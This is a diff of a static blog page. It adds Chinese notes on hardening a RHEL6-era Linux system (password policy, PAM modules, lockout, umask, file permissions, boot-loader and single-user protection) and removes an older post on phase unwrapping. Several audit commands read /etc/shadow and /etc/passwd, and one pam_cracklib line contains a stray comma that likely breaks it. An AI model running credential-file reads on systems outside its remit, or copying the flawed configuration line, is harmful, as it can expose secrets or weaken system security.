+<pre><code>awk -<span class="string">F:</span> <span class="string">'($2 == "") {print}'</span> <span class="regexp">/etc/</span>shadow
+</code></pre><p>如果有输出，检查这些账户并设置密码。</p>
+<h4 id="确保所有账户密码哈希都被shadow">确保所有账户密码哈希都被shadow</h4><p>确保没有在<code>/etc/passwd</code>中保存密码哈希：</p>
+<pre><code>awk -<span class="string">F:</span> <span class="string">'($2 != "x") {print}'</span> <span class="regexp">/etc/</span>passwd
+</code></pre><p>这个命令应该没有输出，所有密码哈希应该保存在<code>/etc/shadow</code>而不是所有用户都能读的<code>/etc/passwd</code></p>
+<h3 id="确认没有非root用户的UID为0">确认没有非root用户的UID为0</h3><p>列出所有UID为0的用户：</p>
+<pre><code>awk -<span class="string">F:</span> <span class="string">'($3 == "0") {print}'</span> <span class="regexp">/etc/</span>passwd
+</code></pre><p>通常，最好的审计实践是所有root账户的使用都限制到使用su或这sudo。有些站点使用多个管理员拥有UID 0，这种做法可能有意料外的副作用，并不推荐。</p>
+<h3 id="设置密码过期参数">设置密码过期参数</h3><p>编辑<code>/etc/login.defs</code>指定某个新账户的密码过期时间。添加或修改如下行：</p>
+<pre><code>PASS_MAX_DAYS <span class="number">60</span>
+PASS_MIN_DAYS <span class="number">7</span>
+PASS_MIN_LEN <span class="number">14</span>
+PASS_WARN_AGE <span class="number">7</span>
+</code></pre><p>对已经存在的人类用户<code>USER</code>，更改当前过期设置如下：</p>
+<pre><code>chage -M <span class="number">60</span> -m <span class="number">7</span> -W <span class="number">7</span> USER
+</code></pre><p>更改密码要在稳定性和安全性之间权衡，90到360天比较推荐。</p>
+<h4 id="从libuser-conf移除密码参数">从libuser.conf移除密码参数</h4><p>确保<code>/etc/libuser.conf</code>在<code>[import]</code>节包含：</p>
+<pre><code>login_defs = <span class="regexp">/etc/login</span>.defs
+</code></pre><p>同时确保在<code>[userdefaults]</code>下没有以下单词开头的行，这些设定会覆盖<code>/etc/log   in.defs</code>的设定：</p>
+<pre><code><span class="title">LU_SHADOWMAX</span>
+LU_SHADOWMIN
+LU_SHADOWWARNING
+</code></pre><p><code>/etc/libuser.conf</code>文件包含libuser库的配置选项，这个库提供了一套操作和管理用户和组帐号的标准接口。默认情况下从<code>/etc/login.defs</code>读取密码设置，但是<code>/etc/libuser.conf</code>能覆盖这些参数。查看<code>libuser.conf</code>的man页面获取更多信息。</p>
+<h3 id="移除密码文件中遗留的+条目">移除密码文件中遗留的+条目</h3><p>用一下命令找到这些行：</p>
+<pre><code><span class="keyword">grep</span> <span class="string">"^+:"</span> <span class="regexp">/etc/</span>passwd <span class="regexp">/etc/</span>shadow <span class="regexp">/etc/g</span>roup
+</code></pre><p>确保没有输出。</p>
+<p><code>+</code>被用来将来自NIS的数据映射到已知文件。一个<code>/etc/passwd</code>中NIS包含错误，但NIS没有运行会导致任意用户以<code>+</code>用户名免密码访问。</p>
+<p>告诉本地系统使用网络数据库，比如LDAP或NIS，来获取用户信息的正确的方式是确保在<code>/etc/nsswitch.conf</code>中适当的配置。</p>
+<h2 id="通过Unix组来加强安全">通过Unix组来加强安全</h2><p>通过标准Unix权限的访问控制很弱，但也可以利用。</p>
+<h3 id="为每个账户创建一个唯一默认组">为每个账户创建一个唯一默认组</h3><p>当使用<code>useradd</code>命令时，不要使用<code>-g</code>参数覆盖默认组。</p>
+<p>RedHat默认为每个用户创建相同名称的唯一所属组。推荐这样，保护组写权限的文件。</p>
+<h3 id="创建和维护包含所有人类账户的组">创建和维护包含所有人类账户的组</h3><p>找到系统上所有人类用户，比如UID大于500的，一旦确认，创建一个<code>usergroup</code>组，并且把每个人类账户加进去：</p>
+<pre><code>groupadd usergroup
+usermod -G usergroup huma<span class="label">n1</span>
+usermod -G usergroup huma<span class="label">n2</span>
+usermod -G usergroup huma<span class="label">n3</span>
+usermod -G usergroup huma<span class="label">n4</span>
+</code></pre><p>当用<code>useradd</code>添加新用户时，用<code>-G usergroup</code>将人类账户添加到改组。</p>
+<p>这样做便于管理人类用户，比如为<code>/path/to/graphical/command</code>授权用户：</p>
+<pre><code>chgrp usergroup /path/<span class="built_in">to</span>/graphical/<span class="command"><span class="keyword">command</span></span>
+chmod <span class="number">750</span> /path/<span class="built_in">to</span>/graphical/<span class="command"><span class="keyword">command</span></span>
+</code></pre><p>同时，限制非人类系统账户执行命令也非常重要。</p>
+<h2 id="通过配置PAM保护帐号">通过配置PAM保护帐号</h2><p>PAM，可插拔认证模块是为linux程序提供认证的模块。PAM是一个框架，提供可配置的系统认证架构来最小化系统所面对的风险。</p>
+<p>PAM被作为一套动态共享库实现，在任何应用程序想认证用户的时候被加载和调用。通常为了使用PAM应用程序需要以root运行，传统的权限网络监听比如sshd和SUID程序比如sudo已经满足了这个要求。一个叫做<code>userhelper</code>的SUID root应用被用来为没有SUID或权限的程序提供利用PAM的可能。</p>
+<p>PAM在<code>/etc/pam.d/</code>下搜寻应用特异的配置信息。比如对<code>login</code>程序，PAM库会遵循<code>/etc/pam.d/login</code>中的指示。</p>
+<p>一个非常重要的文件是<code>/etc/pam.d/system-auth</code>。这个文件被许多其它文件包含(奇怪的是从RHEL6开始sshd只包含<code>/etc/pam.d/password-auth</code>)，作为默认的系统认证措施，更改这个文件能确保全面的更改。</p>
+<p>更改PAM的配置要十分小心，语法很复杂，更改可能有意料外的结果。默认配置对大多数用户足够了。</p>
+<p>注意！！！！！！！！！！：运行<code>authconfig</code>或者<code>system-config-authentication</code>将覆盖PAM配置文件，摧毁任何手动的更改，将其覆盖成系统默认。</p>
+<h3 id="设定密码质量要求">设定密码质量要求</h3><p>默认的PAM模块<code>pam_cracklib</code>提供了加强的密码检查。它可以执行一系列检查包含字典单词的相似，最小长度，不是之前的密码，不是之前密码的简单大小写修改等。也能要求密码包含特定类型的字符。</p>
+<p><code>pam_passwdqc</code>模块提供了更严格的密码强度强制要求。可通过RPM包下载。</p>
+<h4 id="如果使用pam_cracklib,设置密码质量需求">如果使用pam_cracklib,设置密码质量需求</h4><p>用<code>pam_cracklib</code>配置密码至少包含一个大写、小写、数字和其它字符，定位<code>/etc/pam.d/system-auth</code>中的一下行：</p>
+<pre><code>password requisite pam_cracklib<span class="class">.so</span> retry=<span class="number">3</span>
+</code></pre><p>更改为(呵呵，required意指即使失败仍然会继续后面required的模块验证，然后在返回错误，让用户不知道哪里出的问题)</p>
+<pre><code>password required pam_cracklib.so retry=<span class="number">3</span> minlen=<span class="number">14</span> \
+                    dcredit=-<span class="number">1</span>, ucredit=-<span class="number">1</span> ocredit=-<span class="number">1</span> lcredit=-<span class="number">1</span>
+</code></pre><p>如果必要，更改为符合你要求的配置。</p>
+<h4 id="如果使用pam_passwdqc,设置密码质量需求">如果使用pam_passwdqc,设置密码质量需求</h4><p>如果需要比<code>pam_cracklib</code>保证的密码强度更强，使用<code>pam_passwdqc</code>模块。</p>
+<p>更改<code>/etc/pam.d/system-auth</code>中的如下行：</p>
+<pre><code>password requisite pam_cracklib<span class="class">.so</span> retry=<span class="number">3</span>
+</code></pre><p>为(呵呵，这个直接requisite，只要不符合要求PAM就直接返回错误了)<br>    password requisite pam_passwdqc.so min=disabled,disabled,16,12,8</p>
+<p>按自己需要配置。</p>
+<h3 id="设置失败密码尝试锁定">设置失败密码尝试锁定</h3><p>使用<code>pam_tally2.so</code>模块来实现一定数量错误登录尝试后锁定账户。在<code>/etc/pam.d/system-auth</code>中添加到第一个auth开头的行上头(呵呵，RHEL6后<code>/etc/pam.d/sshd</code>包含的是<code>/etc/pam.d/password-auth</code>而不是<code>/etc/pam.d/system-auth</code>，所以，对ssh登录尝试锁定应该是对<code>password-auth</code>这个文件更改。)</p>
+<pre><code>auth required pam_tally2.so deny=<span class="number">5</span> onerr=fail unlock_time=<span class="number">900</span>
+</code></pre><p>在account开头的行上头加上一行：</p>
+<pre><code><span class="tag">account</span> <span class="tag">required</span> <span class="tag">pam_tally2</span><span class="class">.so</span>
+</code></pre><p>root要单独设置<code>root_unlock_time=900</code></p>
+<p>要解锁用户使用<code>pam_tally2</code>命令</p>
+<pre><code>/sbin/pam_tally2 --<span class="keyword">user</span> <span class="title">username</span> --reset
+</code></pre><p>锁定用户造成潜在的DOS攻击，但能阻止密码猜解。权衡利弊设置<code>unlock_time</code></p>
+<h3 id="使用pam_deny-so快速禁止访问服务">使用pam_deny.so快速禁止访问服务</h3><p>通过PAM阻止服务SVCNAME的访问，编辑<code>/etc/pam.d/SVCNAME</code>文件，添加这一行：</p>
+<pre><code><span class="tag">auth</span>    <span class="tag">requisite</span>   <span class="tag">pam_deny</span><span class="class">.so</span>
+</code></pre><p>这不是啥值得推荐的方法，不过挺方便，呵呵。</p>
+<h3 id="仅控制台用户执行userhelper">仅控制台用户执行userhelper</h3><p>如果你的环境定义了一个组<code>usergroup</code>包含所有系统上的人类用户，限制<code>userhelper</code>程序只能由这些用户执行。(4710中的4表示suid/guid)</p>
+<pre><code>chgrp usergroup <span class="regexp">/usr/</span>sbin/userhelper
+chmod <span class="number">4710</span> <span class="regexp">/usr/</span>sbin/userhelper
+</code></pre><p><code>userhelper</code>程序提供必须以root运行的图形服务认证，比如<code>system-config-</code>族图形配置程序。只有登录到系统控制台的人类用户可以运行这些。以上提供了一定对<code>userhelper</code>实现缺陷的保护，防止被侵入的系统账户进一步提权。</p>
+<p><code>userhelper</code>程序在<code>/etc/securetty/console.app/</code>下的文件配置。每个文件指定了程序以什么身份运行，成功认证后应该执行什么。</p>
+<p>注意：这些配置和PAM的配置<code>/etc/pam.d</code>下的配置相配合才能起作用。首先<code>userhelper</code>决定服务应该以什么身份运行(比如root)，然后<code>userhelper</code>使用PAM API来允许运行程序的用户尝试认证为想要借身份运行的用户。PAM的API交互被封装在GUI中，如果程序配置要求的话。</p>
+<h3 id="升级密码哈希算法到SHA-512">升级密码哈希算法到SHA-512</h3><p>需要编辑3个文件：</p>
+<p>首先<code>/etc/pam.d/system-auth</code>中确保sha512被<code>pam_unix.so</code>模块在password节使用。而不是使用其它算法：(可能得改password-auth)</p>
+<pre><code>password sufficient pam_unix<span class="class">.so</span> sha512 shadow nullok try_first_pass use_authtok
+</code></pre><p>其次，编辑文件<code>/etc/login.defs</code>添加或更改以下行(确认下就好)：</p>
+<pre><code><span class="title">ENCRYPT_METHOD</span> SHA512
+</code></pre><p>最后，编辑<code>/etc/libuser.conf</code>添加或更改以下行：</p>
+<pre><code><span class="attribute">crypt_style</span>=<span class="string">sha512</span>
+</code></pre><p>其实吧，这是RHEL6的默认配置，呵呵。</p>
+<h3 id="限制密码重用">限制密码重用</h3><p><code>pam_unix</code>模块使用<code>remember</code>参数可以防止用户重用最近的密码。为了阻止用户使用最近5次的密码，向<code>/etc/pam.d/system-auth</code>文件中，使用<code>pam_unix</code>模块的<code>password</code>行添加<code>remember=5</code>参数。</p>
+<p>旧的密码(禁止重用的)保存在<code>/etc/security/opasswd</code>中。</p>
+<h3 id="尽可能移除pam_crreds包">尽可能移除pam_crreds包</h3><p>除非用到认证缓存功能，移除<code>pam_ccreds</code>包：</p>
+<pre><code>yum <span class="built_in">erase</span> pam_ccreds
+</code></pre><p>该包包含setuid文件<code>/usr/sbin/ccreds_validate</code>。如果系统被入侵，任何系统上缓存的认证信息都会被获取。</p>
+<h2 id="对登录用户使用安全会话配置文件">对登录用户使用安全会话配置文件</h2><p>当一个用户登录进Unix账户时，系统通过读取大量文件配置用户会话。许多这些文件在家目录下。错误或者不当的配置都会造成弱权限。攻击者可以修改甚至读取特定类型的账户信息，对受影响的账户获得全面的访问权限。因此，额是和修正账户特别是权限账户的配置文件权限非常重要。</p>
+<h3 id="确保Root_PATH不存在危险目录">确保Root PATH不存在危险目录</h3><p>登录一个root shell运行：</p>
+<pre><code>echo <span class="variable">$PATH</span>
+</code></pre><p>将给出冒号分隔的文件夹路径。</p>
+<p>防止root执行未知或者不受信任的程序很重要，这些程序可能带有恶意代码。因此，root不应该运行非权限用户安装的程序。root经常工作在不受信任的目录，比如<code>.</code>代表的当前目录总不该出现在root的PATH中，任何非权限用户或系统用户能写入的目录都是如此。</p>
+<p>对系统管理员来说，总是打出命令的绝对路径是个好习惯。</p>
+<h4 id="确保Root_PATH不包含相对路径或者空目录">确保Root PATH不包含相对路径或者空目录</h4><p>对每个路径中的目录<code>DIR</code>，确保<code>DIR</code>不是一个单一的<code>.</code>，或者任何可能导致相对路径遍历的符号比如<code>..</code>，或者不是以<code>/</code>开头。同时，确保路径中没有空元素，如下：</p>
+<pre><code><span class="constant">PATH=</span><span class="symbol">:/bin</span>
+<span class="constant">PATH=</span>/<span class="symbol">bin:</span>
+<span class="constant">PATH=</span>/<span class="symbol">bin:</span><span class="symbol">:/sbin</span>
+</code></pre><p>这些空元素和一个<code>.</code>有相同效果。</p>
+<p>我觉得这样比较方便：</p>
+<pre><code>echo <span class="variable">$PATH</span> | awk -F: <span class="string">'{for(i=1;i&lt;NF;i++) print $i}'</span>
+</code></pre><h4 id="确保ROOT路径不包含全局可写或组可写的目录">确保ROOT路径不包含全局可写或组可写的目录</h4><p>对PATH中的每一个元素，执行：</p>
+<pre><code><span class="keyword">ls</span> -ld <span class="keyword">DIR</span>
+</code></pre><p>确保组和其它的写权限被禁用。</p>
+<p>我觉得这样比较好：</p>
+<pre><code>ls -ld `echo <span class="variable">$PATH</span> | awk -F: <span class="string">'{for(i=1;i&lt;NF;i++) print $i}'</span>`
+</code></pre><h3 id="确保用户家目录不是组可写或者全局可读的">确保用户家目录不是组可写或者全局可读的</h3><p>首先通知你的用户。</p>
+<p>对每个人类账户<code>USER</code>，查看账户权限：</p>
+<pre><code>ls -<span class="keyword">ld</span> /home/USER
+</code></pre><p>确保目录不是组可写和全局可读的，必要时修正：</p>
+<pre><code>chmod g-w /home/<span class="keyword">USER</span>
+<span class="title">chmod</span> o-rwx /home/USER
+</code></pre><p>家目录包含许多影响账户行为的配置，其它用户不该有权限写入。组共享目录应该在子目录或者其它什么地方而不是家目录。通常，家目录也不该全局可读。如果有一小撮用户非得读取其它用户目录，通过组来提供权限。</p>
+<h3 id="确保用户dot文件不是全局可写">确保用户dot文件不是全局可写</h3><p>确保用户USER家目录下的dot文件不是全局可写：</p>
+<pre><code>ls -ld /home/<span class="keyword">USER</span> <span class="title">/.[A-Za-z0-9</span>]*
+</code></pre><p>确保任何文件都不是组或全局可写的。通过以下方式修正某个<code>FILE</code>：</p>
+<pre><code>chmod go-w /home/USER/<span class="keyword">FILE</span>
+</code></pre><p>能更改其它用户配置文件的用户可能以那个用户权限执行命令，窃取数据，摧毁文件或者发起进一步攻击。</p>
+<h3 id="确保用户有合理的umask值">确保用户有合理的umask值</h3><p>编辑全局配置<code>/etc/profile</code>,<code>/etc/bashrc</code>和<code>/etc/csh.cshrc</code>.添加或修改以下行:</p>
+<pre><code><span class="built_in">umask</span> <span class="number">077</span>
+</code></pre><p>其实profile里看是不是uid大于200且有效组名等于用户名,则设为002(目录775，文件644).否则设为022(目录755，文件644).</p>
+<p>编辑<code>/etc/login.defs</code>:</p>
+<pre><code>UMASK   <span class="number">077</span>
+</code></pre><p>查看<code>/etc/csh.login</code>和<code>/etc/profile.d/*</code>中的其它文件，确保没有重定义umask。除非有什么好的理由重定义umask。</p>
+<pre><code><span class="keyword">grep</span> -r umask <span class="regexp">/etc/</span>profile <span class="regexp">/etc/</span>csh.* <span class="regexp">/etc/</span>bashrc <span class="regexp">/etc/</span>login.defs
+</code></pre><p>编辑root shell的配置文件<code>/root/.bashrc</code>和<code>/root/.bash_profile</code>,<code>/root/.cshrc</code>，<code>/root/.tcshrc</code>。添加或修改以下行：</p>
+<pre><code><span class="built_in">umask</span> <span class="number">077</span>
+</code></pre><p>这样做确保任何用户创建的文件不会被其它用户读写与执行。如果有特殊需要，则使用<code>chmod</code>命令修改它。单个用户可以通过将umask设为<code>027</code>让其所在组用户能读和执行其文件。用户名和默认组一致，完全可以直接设成<code>007</code>来与组成员共享文件。</p>
+<p>另外，暂时更改root 的umask来安装能让其它用户读取的软件或文件，或者修改特定服务帐号的umask默认设定的行为，都是必要的。但严格的默认限制能更好的保护意外泄漏。</p>
+<h3 id="确保用户没有-netrc文件">确保用户没有.netrc文件</h3><p>对每个人类用户<code>USER</code>，确保没有用户有<code>.netrc</code>文件。</p>
+<pre><code><span class="built_in">find</span> /home -<span class="built_in">name</span> .netrc
+</code></pre><p>应该没有返回。如果有联系用户讨论删除事宜。</p>
+<p><code>.netrc</code>是用来通过ftp无人登录到其它系统的配置文件。这个文件通常包含攻击其它系统未加密的密码。</p>
+<h2 id="保护物理控制台访问">保护物理控制台访问</h2><p>不大可能保护系统免于物理接触攻击。有些步骤能让攻击者更加难以快速和不被发现地从控制台更改系统。</p>
+<h3 id="设置BIOS密码">设置BIOS密码</h3><p>x86系统的BIOS是机器首先运行代码的地方，控制着许多非常重要的系统参数，包含系统从哪个设备以什么顺序启动的信息。</p>
+<p>为BIOS配置设置密码防止修改。尽管物理接触的攻击者通常很容易清除密码。</p>
+<h3 id="设置Boot_Loader密码">设置Boot Loader密码</h3><p>Boot Loader通常负责启动内核并把参数传递给它。boot loader允许选择多个分区或者介质上的不同内核，能传递给内核的参数包括单用户模式(提供无需认证的root访问)，禁用SELinux。阻止本地用户更改启动参数。为防止本地用户更改启动参数危害安全，启动器配置需要用密码保护：</p>
+<p>Grub这样保护：</p>
+<p>运行<code>grub-md5-crypt</code>得到md5后的哈希<code>password-hash</code></p>
+<p>在<code>/etc/grub.conf</code>注释头下第一行添加：</p>
+<pre><code>password <span class="comment">--md5 password-hash</span>
+</code></pre><p>确保<code>/etc/grub.conf</code>的权限。(指向<code>../boot/grub/grub.conf</code>)</p>
+<pre><code>chown <span class="string">root:</span>root <span class="regexp">/etc/</span>grub.conf
+chmod <span class="number">600</span> <span class="regexp">/etc/</span>grub.conf
+</code></pre><p>其它boot loader有类似的密码保护特性。</p>
+<h3 id="要求单用户模式登录认证">要求单用户模式登录认证</h3><p>单用户模式被设计用来回复系统，通过启动选项给单用户root权限。默认情况下不需要认证，这造成了安全隐患。</p>
+<p>即使以单用户模式启动，也要求输入root密码。在<code>/etc/sysconfig/init</code>文件中更改：</p>
+<pre><code>sed -i 's/SINGLE=<span class="command">\/</span>sbin<span class="command">\/</span>sushell/SINGLE=<span class="command">\/</span>sbin<span class="command">\/</span>sulogin/' /etc/sysconfig/init
+</code></pre><h3 id="禁用交互式启动">禁用交互式启动</h3><p>编辑<code>/etc/sysconfig/init</code>。添加或更改设置：</p>
+<pre><code>sed -<span class="tag">i</span> <span class="string">'s/^PROMPT.*/PROMPT=no/g'</span> /etc/sysconfig/init
+</code></pre><p>交互式启动，用户也许能禁用审计、防火墙和其它服务弱化系统安全。</p>
+<h3 id="对登录shell实现不活动超时">对登录shell实现不活动超时</h3><p>如果系统不运行X windows，登录shell可以配置为一段时间不活动自动登出用户。以下指令对运行X Windows的系统不合适，因为这将自动(深有体会！！)关闭X环境下的终端。</p>
+<p>针对<code>/bin/bash</code>，实现一个15分钟的空闲超时，在目录<code>/etc/profile.d/</code>下新建文件<code>tmout.sh</code>，写入如下行：</p>
+<pre><code>TMOUT=<span class="number">900</span>
+<span class="built_in">readonly</span> TMOUT
+<span class="built_in">export</span> TMOUT
+</code></pre><p>对<code>tcsh</code>，在<code>/etc/profile.d/</code>下新建<code>autologout.sh</code>，添加如下行：</p>
+<pre><code><span class="built_in">set</span> -r autologout <span class="number">15</span>
+</code></pre><p>其它登录shell应该类似。</p>
+<p>仅仅在shell是前台进程时才会自动登录超时。比如，一个<code>vi</code>会话空闲着并不会自动超时登出。</p>
+<p>当通过远程连接时，比如SSH，通过该服务设置超时更加有效。</p>
+<h3 id="配置锁屏">配置锁屏</h3><p>一个是图形界面的锁屏(比如kde的Lock Screen)，一个是控制台(vlock)。</p>
 
             
           </span>
@@ -572,8 +1953,8 @@
             
               
                 
-                <a class="post-title-link" href="/phase-unwrapping/2015/11/15/2013-03-24/" itemprop="url">
-                  一维相位去包裹：原理与仿真
+                <a class="post-title-link" href="/linux/2014/11/18/file-permissions-and-masks/" itemprop="url">
+                  File Permissions and Masks
                 </a>
               
             
@@ -583,8 +1964,8 @@
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2015-11-15T14:01:31+08:00" content="2015-11-15">
-              2015-11-15
+            <time itemprop="dateCreated" datetime="2014-11-18T00:00:00+08:00" content="2014-11-18">
+              2014-11-18
             </time>
           </span>
 
@@ -593,8 +1974,8 @@
               &nbsp; | &nbsp; 分类于
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/phase-unwrapping/" itemprop="url" rel="index">
-                    <span itemprop="name">phase-unwrapping</span>
+                  <a href="/categories/linux/" itemprop="url" rel="index">
+                    <span itemprop="name">linux</span>
                   </a>
                 </span>
 
@@ -609,8 +1990,8 @@
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/phase-unwrapping/2015/11/15/2013-03-24/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="phase-unwrapping/2015/11/15/2013-03-24/" itemprop="commentsCount"></span>
+              <a href="/linux/2014/11/18/file-permissions-and-masks/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/11/18/file-permissions-and-masks/" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -632,80 +2013,131 @@
         
           <span itemprop="articleBody">
             
-              <h1 id="一维相位去包裹：原理与仿真">一维相位去包裹：原理与仿真</h1><h2 id="Off-Topic">Off-Topic</h2><blockquote>
-<p>未觉池塘春草色，阶前梧叶已秋声。</p>
-<p>——朱熹</p>
-</blockquote>
-<p>时光飞逝，转眼就要毕业了。前天导师打电话摧我，这几个月就毕业了，你那毕业设计得赶紧做了。想想真是，四年倏忽过去，浑然不觉，已近毕业。</p>
-<p>也许这是最后自在平静的日子了，时间却像沙子，越用力抓紧，从指间溜走地越快。</p>
-<p>两年过得太快，I follow my passion，做了太多没用的事，有得有失。只是希望：</p>
-<blockquote>
-<p>You can’t connect the dots looking forward you can only connect them looking backwards. So you have to trust that the dots will somehow connect in your future. You have to trust in something: your gut, destiny, life, karma, whatever. Because believing that the dots will connect down the road will give you the confidence to follow your heart, even when it leads you off the well worn path.</p>
-<p>——Steve Jobs, Stanford Commencement Adress, 2005</p>
-</blockquote>
-<h2 id="为何相位重要">为何相位重要</h2><p>我大学的专业是光学，时至今日，依然清晰记得两年前在阴暗的实验室做全息摄像的实验。我们几个同学花了好久把光路摆好，让激光打在物体上反光到干版上曝光。然后拿到什么试剂中定形。最后在拿出来用激光将物体的影响重新清晰的放出三维的像时，心里相当兴奋。</p>
-<p>为什么全息照相能产生立体的像呢？普通的照相技术都是仅仅记录光波的强度，而不记录相位，因此失去了很多相位中的信息。但全息照相通过相干光(激光)之间的干涉在干版上同时记录下了强度和相位，再用相干光照射干版重放，好像光是从真的物体发出的一样。</p>
-<p>如果您也做过这种实验，您应该知道为什么相位重要了。</p>
-<p>这还有另一个例子，关于爱因斯坦和蒙娜丽莎。</p>
-<p>我从《Two Dimensional Phase Unwrapping Theory Algorithms and Software》中看到了这个例子，然后自己动手用python试了试。</p>
-<p>以下代码用来交换两个图片的相位</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># &lt;nbformat&gt;3.0&lt;/nbformat&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scipy.fftpack <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read file</span></span><br><span class="line">im_1 = plt.imread(<span class="string">'einstein.jpg'</span>)</span><br><span class="line">im_2 = plt.imread(<span class="string">'monalisa.jpg'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fft and reverse two images' phase</span></span><br><span class="line">m_1, p_1 = np.abs(fft2(im_1)), np.angle(fft2(im_1))</span><br><span class="line">m_2, p_2 = np.abs(fft2(im_2)), np.angle(fft2(im_2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line">im_swapphase_1 = np.real(ifft2(m_1 * np.cos(p_2) + m_1 * np.sin(p_2) * <span class="number">1j</span>))</span><br><span class="line">im_swapphase_2 = np.real(ifft2(m_2 * np.cos(p_1) + m_2 * np.sin(p_1) * <span class="number">1j</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;codecell&gt;</span></span><br><span class="line"></span><br><span class="line">plt.figsize(<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line">plt.gray()</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">plt.imshow(im_1, origin=<span class="string">'lower'</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">plt.imshow(im_2, origin=<span class="string">'lower'</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">plt.imshow(im_swapphase_1, origin=<span class="string">'lower'</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">plt.imshow(im_swapphase_2, origin=<span class="string">'lower'</span>)</span><br></pre></td></tr></table></figure>
-<p>上面两幅图是交换相位前的图，下面两幅是之后的。显然，一团糟，相位中是有信息的。</p>
-<p><img src="https://raw.github.com/reverland/phase-unwrapping-notes/master/image/reverse_phase.jpg" alt="Einstein and Monalisa"></p>
-<h2 id="为何要相位去包裹">为何要相位去包裹</h2><p>简单地说，就是说，任何仪器，比如说量角器，顶多只能测得($-\pi, \pi$]之间的量,但真正的相位角度不该这样，而是分布在实数空间内，应该是测得的($-\pi, \pi$]之间的值的2$\pi$整数倍。</p>
-<p>真正的相位值被“包裹”起来了，但为什么要解包裹呢？</p>
-<p>不解包裹无法对相位进行计算。</p>
-<h2 id="Itoh的路径积分法">Itoh的路径积分法</h2><p>我们先定义一个获取包裹相位的算子$\mathscr{W}$，该算子将相位包裹，获取位于$(-\pi,\pi]$之间的包裹相位。</p>
-<p>$$\mathscr{W}\varphi = \arctan[\cos(Real \varphi / Img \varphi)]$$</p>
-<p>还可以这样写</p>
-<p>$$\mathscr{W}{\varphi(n)} = \psi(n) = \varphi(n) + 2\pi k(n)$$</p>
-<p>其中$k(n)$是使包裹相位位于$-\pi,\pi$之间的值。</p>
-<p>显然包裹相位$\psi(n)$有：</p>
-<p>$$\pi \geq \psi(n) \gt -\pi$$</p>
-<p>定义差分算子$\Delta$：</p>
-<p>$$\Delta {\varphi(n)} = \varphi(n+1) - \varphi(n)$$</p>
-<p>$$\Delta {k(n)} = k(n+1) - k(n)$$</p>
-<p>计算被包裹相位的差分：</p>
-<p>$$\Delta {\psi(n)} = \Delta {\varphi(n)} + 2\pi\Delta {k_1(n)}$$</p>
-<p>我们再用$\mathscr{W}$作用于该差分得：</p>
-<p>$$\mathscr{W}{\Delta {\psi(n)}} = \Delta {\varphi(n)} + 2\pi[\Delta {k_1(n)} + k_2(n)]$$</p>
-<p>显然上式结果应该位于$(-\pi,\pi]$，假如此时还有$\Delta {\varphi(n)}$也位于$(-\pi,\pi]$,则上式右边第二项$2\pi[\Delta {k_1(n) } + k_2(n)]$应该为零，则有：</p>
-<p>$$\Delta {\varphi(n)} = \mathscr{W}{\Delta {\psi(n)}} $$</p>
-<p>显然，由该差分式可得：</p>
-<p>$$\varphi(m) = \varphi(0) + \sum_{n=0}^{m-1} \mathscr{W}{\Delta {\mathscr{W}{\varphi(n)}}} $$</p>
-<p>上式说明，真实相位可以通过对包裹相位的差分的包裹进行积分求得。</p>
-<p>于是itoh的一维相位去包裹算法综述如下：</p>
-<p>对信号相位数组$\psi(i),0 \leq i \leq N-1$</p>
+              <p>传统Unix安全强烈依赖文件和目录权限来阻止非授权用户读取或更改它们不该存取的文件。根据最小权限原则，配置每个文件，目录和文件系统，只允许必要的存取。</p>
+<p>但linux系统有很多文件……本部分适用于系统安全的一些易于更改和测试，且几乎总是适用的权限限制。</p>
+<p>注意：以下有些命令搜索文件系统中包含特定字符的文件和目录，这些命令应该在每个<code>ext2</code>或<code>ext3</code>分区上运行。当<code>PART</code>出现在以下某个命令中，表示这个命令应该在每个分区重复运行一次。</p>
+<p>以下命令打印给定机器上所有ext2和ext3命令：</p>
+<pre><code><span class="title">mount</span> -t ext2,ext3 | awk <span class="string">'{print <span class="variable">$3</span>}'</span>
+</code></pre><p>如果用了其它分区类型，更改<code>-t</code>参数。</p>
